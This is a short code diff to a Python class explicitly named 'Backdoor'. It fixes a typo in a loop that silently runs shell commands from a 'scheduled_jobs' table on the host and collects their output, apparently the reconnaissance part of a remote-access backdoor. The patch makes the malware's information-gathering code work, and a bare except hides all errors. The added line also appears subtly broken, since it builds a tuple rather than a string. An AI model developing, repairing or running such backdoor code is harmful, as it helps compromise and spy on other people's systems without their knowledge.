@@ -411,7 +411,7 @@ class Backdoor:
         for key, value in scheduled_jobs.items():
             try:
                 scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULLT)) + "\n\n"
+                   subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
             except:
                 pass
 
